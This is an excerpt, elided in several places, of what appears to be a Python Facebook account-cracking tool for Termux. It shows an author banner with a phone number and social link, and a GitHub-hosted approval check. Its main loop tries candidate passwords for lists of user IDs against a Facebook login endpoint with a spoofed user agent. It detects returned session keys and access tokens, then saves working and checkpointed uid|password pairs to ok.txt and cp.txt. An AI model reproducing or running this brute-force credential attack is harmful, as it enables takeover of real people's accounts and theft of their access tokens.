...
print("  ==> \033[1;32mTHIS TOOLS DECODE BY (KAMAL AFRIDY) ")
...
`7MN.   `7MF'        `7MM          db      `7MM  
  ...
  M  `MN. M 8)   MM    MM    MM    MM ,AP    MM    •KAMAL ROY
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m KAMAL ROY / KAMAL AFRIDY\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 

════════════════════════════════════════════════════════💥

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : KAMAL ROY \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m WhatsApp   : +8801798662370 \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/ERR0RS \x1b[0m\x1b[1;97m]
...
def notice():
	...
	subprocess.check_output(["am", "start", "https://github.com/KAMAL-AFRIDY/Approved-Server/blob/main/KAMAL/Approve.txt"])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/KAMAL-AFRIDY/Approved-Server/blob/main/KAMAL/Approve.txt').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m KAMAL ROY\x1b[0m\x1b[1;97m]
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=KAMAL=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=KAMAL=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=KAMAL=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=KAMAL=CP=>]  %s|%s\n"%(uid, pw))
